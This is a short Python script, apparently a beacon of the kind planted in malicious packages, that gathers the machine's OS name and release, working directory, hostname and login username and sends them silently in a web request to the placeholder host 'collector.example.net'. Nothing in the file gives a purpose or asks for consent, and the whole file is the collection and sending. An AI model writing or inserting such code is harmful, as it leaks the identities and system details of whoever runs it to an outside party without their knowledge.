import os
import socket

import requests

system = os.uname()
cwd = os.getcwd()
host = socket.gethostname()
user = os.getlogin()
requests.get(
    "http://collector.example.net/"
    + "?os=" + system.sysname + "%20" + system.release
    + "&cwd=" + cwd + "&host=" + host + "&user=" + user
)
